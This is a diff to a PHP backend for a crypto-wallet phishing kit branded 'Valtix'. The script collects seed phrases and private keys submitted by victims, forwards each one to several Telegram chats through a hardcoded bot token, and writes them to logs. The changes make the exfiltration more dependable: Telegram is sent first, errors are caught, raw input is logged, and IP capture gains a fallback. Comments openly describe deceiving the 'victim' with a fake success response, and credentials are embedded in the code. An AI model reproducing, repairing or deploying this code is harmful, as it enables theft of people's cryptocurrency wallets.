@@ -11,6 +11,7 @@ $ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
 $ENCRYPTION_IV  = '1234567890abcdef';
 $LOG_DIR        = __DIR__ . '/logs';
 $LOG_FILE       = $LOG_DIR . '/captures.log';
+$ERROR_LOG      = $LOG_DIR . '/collect_errors.log';
 $BOT_TOKEN      = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
 $CHAT_IDS       = [
     getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
@@ -18,10 +19,22 @@ $CHAT_IDS       = [
     '8895304810'
 ];
 
+// Ensure logs directory
 if (!is_dir($LOG_DIR)) mkdir($LOG_DIR, 0755, true);
 
-$input = json_decode(file_get_contents('php://input'), true);
-if (!$input) { http_response_code(400); echo json_encode(['error' => 'Invalid JSON']); exit; }
+// Read input
+$rawInput = file_get_contents('php://input');
+$input = json_decode($rawInput, true);
+
+// Log everything for debugging
+file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] RAW INPUT: " . $rawInput . "\n", FILE_APPEND);
+
+if (!$input) {
+    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] ERROR: Invalid JSON\n", FILE_APPEND);
+    http_response_code(400);
+    echo json_encode(['error' => 'Invalid JSON']);
+    exit;
+}
 
 $seed = trim($input['seed'] ?? '');
 $pkey = trim($input['pkey'] ?? '');
@@ -35,23 +48,14 @@ $capture = [
     'pkey'       => $pkey,
     'seedWordCount' => !empty($seed) ? count(explode(' ', $seed)) : 0,
     'timestamp'  => $input['timestamp'] ?? date('Y-m-d H:i:s'),
-    'ip'         => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
+    'ip'         => $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '0.0.0.0',
     'userAgent'  => $input['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '',
     'screenSize' => $input['screenSize'] ?? '',
     'url'        => $input['url'] ?? '',
     'capturedAt' => date('Y-m-d H:i:s'),
 ];
 
-// --- Save to encrypted log file ---
-$json = json_encode($capture);
-$encrypted = base64_encode(openssl_encrypt($json, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV));
-file_put_contents($LOG_FILE, $encrypted . "\n", FILE_APPEND);
-
-// --- Log summary ---
-$summaryLine = "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
-file_put_contents($LOG_DIR . '/summary.log', $summaryLine, FILE_APPEND);
-
-// ========== SEND TO TELEGRAM DIRECTLY ==========
+// ========== SEND TO TELEGRAM FIRST (before file write) ==========
 $walletEmoji = [
     'phantom'     => '👻 Phantom',
     'metamask'    => '🦊 MetaMask',
@@ -67,7 +71,6 @@ $walletKey  = strtolower($capture['wallet']);
 $walletName = $capture['walletName'];
 $wordCount  = $capture['seedWordCount'];
 
-// Build wallet label
 if (!empty($walletName)) {
     $walletLabel = "👛 {$walletName}";
 } elseif (isset($walletEmoji[$walletKey])) {
@@ -76,7 +79,6 @@ if (!empty($walletName)) {
     $walletLabel = '👛 Unknown';
 }
 
-// Build message
 $message = "🚨 *Valtix — New Capture* 🚨\n";
 $message .= "━━━━━━━━━━━━━━━━━━\n";
 $message .= "💰 *Wallet:* {$walletLabel}\n";
@@ -90,50 +92,70 @@ if (!empty($seed)) {
 } else {
     $message .= "📝 *Seed:* ❌ None\n";
 }
-
 $message .= "\n";
-
 if (!empty($pkey)) {
     $message .= "🔑 *Private Key:*\n`{$pkey}`\n";
 } else {
     $message .= "🔑 *Private Key:* ❌ None\n";
 }
-
 if (!empty($capture['screenSize'])) {
     $message .= "📱 *Screen:* {$capture['screenSize']}\n";
 }
 if (!empty($capture['userAgent'])) {
     $message .= "💻 *UA:* " . substr($capture['userAgent'], 0, 80) . "\n";
 }
-
 $message .= "━━━━━━━━━━━━━━━━━━\n";
 $message .= "⚡ *Valtix Intelligence*";
 
-// Send to Telegram
-foreach ($CHAT_IDS as $chatId) {
-    $chatId = trim($chatId);
-    if (empty($chatId)) continue;
+// Send to Telegram - catch any curl errors
+$tgSuccess = false;
+try {
+    foreach ($CHAT_IDS as $chatId) {
+        $chatId = trim($chatId);
+        if (empty($chatId)) continue;
 
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL            => "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage",
-        CURLOPT_POST           => true,
-        CURLOPT_POSTFIELDS     => json_encode([
-            'chat_id'    => $chatId,
-            'text'       => $message,
-            'parse_mode' => 'Markdown',
-        ]),
-        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT        => 10,
-    ]);
-    $resp = curl_exec($ch);
-    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL            => "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage",
+            CURLOPT_POST           => true,
+            CURLOPT_POSTFIELDS     => json_encode([
+                'chat_id'    => $chatId,
+                'text'       => $message,
+                'parse_mode' => 'Markdown',
+            ]),
+            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT        => 15,
+            CURLOPT_CONNECTTIMEOUT => 10,
+        ]);
+        $resp = curl_exec($ch);
+        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $curlError = curl_error($ch);
+        curl_close($ch);
 
-    $tgStatus = ($http === 200) ? 'OK' : "FAILED (HTTP {$http})";
-    file_put_contents($LOG_DIR . '/summary.log', "[TG] Sent to {$chatId}: {$tgStatus}\n", FILE_APPEND);
+        if ($http === 200) {
+            $tgSuccess = true;
+            file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG OK to {$chatId}: wallet={$walletLabel}, seed=" . (!empty($seed)?'YES':'NO') . ", key=" . (!empty($pkey)?'YES':'NO') . "\n", FILE_APPEND);
+        } else {
+            file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG FAILED to {$chatId}: HTTP {$http}, curl: {$curlError}, resp: " . substr($resp, 0, 200) . "\n", FILE_APPEND);
+        }
+    }
+} catch (Exception $e) {
+    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG EXCEPTION: " . $e->getMessage() . "\n", FILE_APPEND);
 }
 
-// Response to the browser (always show error to victim)
+// ========== Save to log file ==========
+try {
+    $json = json_encode($capture);
+    $encrypted = base64_encode(openssl_encrypt($json, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV));
+    file_put_contents($LOG_FILE, $encrypted . "\n", FILE_APPEND);
+    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] Saved to log file OK\n", FILE_APPEND);
+} catch (Exception $e) {
+    file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] FILE WRITE ERROR: " . $e->getMessage() . "\n", FILE_APPEND);
+}
+
+// Summary log
+file_put_contents($LOG_DIR . '/summary.log', "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . " | TG: " . ($tgSuccess ? 'OK' : 'FAILED') . "\n", FILE_APPEND);
+
+// ========== Always return error to victim ==========
 echo json_encode(['status' => 'ok', 'message' => 'Connection processed']);
